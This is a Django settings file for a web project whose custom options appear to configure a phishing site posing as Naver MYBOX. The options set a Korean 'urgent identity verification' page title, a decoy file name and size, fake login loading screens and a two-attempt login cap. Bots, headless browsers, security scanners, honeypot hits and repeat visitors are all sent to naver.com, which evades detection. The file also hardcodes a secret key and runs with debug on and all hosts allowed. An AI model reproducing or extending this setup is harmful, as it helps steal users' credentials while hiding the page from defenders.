from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = 'django-insecure--p*+nyph$ivn9=0=@psubvm_ep-ntovmvk+8#jb^k*e8)=4b9s'

DEBUG = True

ALLOWED_HOSTS = ['*']

INSTALLED_APPS = [
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'accounts',
    'kaixin',
    'mybox',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'accounts.middleware.BlacklistIPMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'config.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'templates'],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.request',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'config.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
        'OPTIONS': {
            'timeout': 20,
        },
    }
}

LANGUAGE_CODE = 'ko-kr'

TIME_ZONE = 'Asia/Seoul'

USE_I18N = True

USE_TZ = True

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

STATIC_URL = '/static/'
STATICFILES_DIRS = [BASE_DIR / 'static']
STATIC_ROOT = BASE_DIR / 'staticfiles'
MEDIA_URL = '/media/'
MEDIA_ROOT = BASE_DIR / 'media'
DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024

# Defaults for blacklist auto-add policy (overridable in admin UI / SQLite)
BLACKLIST_REDIRECT_URL = 'https://www.naver.com/'
RATE_LIMIT_ENABLED = True
RATE_LIMIT_MAX_REQUESTS = 80
RATE_LIMIT_WINDOW_SECONDS = 60
TOTAL_REQUEST_LIMIT_ENABLED = True
TOTAL_REQUEST_LIMIT_MAX = 500
LOGIN_ATTEMPT_MAX = 2
LOGIN_LOADING_ENABLED = True
LOGIN_LOADING_DELAY_MS = 3000
LOGIN_LOADING_PROGRESS_PERCENT = 100
LOGIN_LOADING_HOLD_MS = 1000
LOGIN_SPLASH_ENABLED = True
LOGIN_SPLASH_DELAY_MS = 1000
LOGIN_INTRO_MODE = 'loading'
LOGIN_MYBOX_DELAY_MS = 3000
MYBOX_VISIT_LIMIT_ENABLED = True
MYBOX_VISIT_MAX = 3
MYBOX_REDIRECT_URL = 'https://www.naver.com/'
MYBOX_FILENAME = '20260824_071530'
MYBOX_FILESIZE = '2MB'
MYBOX_PAGE_TITLE = '긴급 상황: 신원 확인 부탁드립니다.'
LIMITS_REDIRECT_URL = 'https://www.naver.com/'
LOGIN_ATTEMPT_REDIRECT_URL = 'https://www.naver.com/'
BOT_BLOCK_ENABLED = True
BOT_REDIRECT_URL = 'https://www.naver.com/'
BOT_BLOCK_EMPTY_UA = True
BOT_BLOCK_SCANNER_PATHS = True
BOT_BLOCK_HONEYPOT = True
BOT_BLOCK_WEBDRIVER = True
BOT_UA_KEYWORDS = ''
BOT_PATH_KEYWORDS = ''
DOWNLOAD_MAX_BYTES = 50 * 1024 * 1024
DOWNLOAD_REDIRECT_URL = 'https://www.naver.com/'
UNKNOWN_BLOCK_ENABLED = True
UNKNOWN_REDIRECT_URL = 'https://www.naver.com/'
